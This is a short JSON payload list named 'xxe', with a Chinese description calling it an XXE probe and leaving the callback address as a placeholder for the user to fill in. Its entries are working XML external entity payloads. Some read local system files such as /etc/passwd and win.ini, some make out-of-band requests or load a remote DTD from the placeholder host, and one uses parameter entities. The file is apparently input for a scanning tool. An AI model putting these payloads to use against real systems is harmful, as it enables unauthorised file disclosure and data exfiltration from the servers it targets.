{
  "name": "xxe",
  "说明": "XXE 探针。带外实体地址留 <CALLBACK> 由使用者替换。",
  "sets": {
    "file": [
      "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
      "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>"
    ],
    "oob": [
      "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://<CALLBACK>/\">]><r>&x;</r>",
      "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://<CALLBACK>/e.dtd\">%p;]><r/>"
    ],
    "param": [
      "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY b \"%a;\">]><r>&b;</r>"
    ]
  },
  "pairs": {}
}
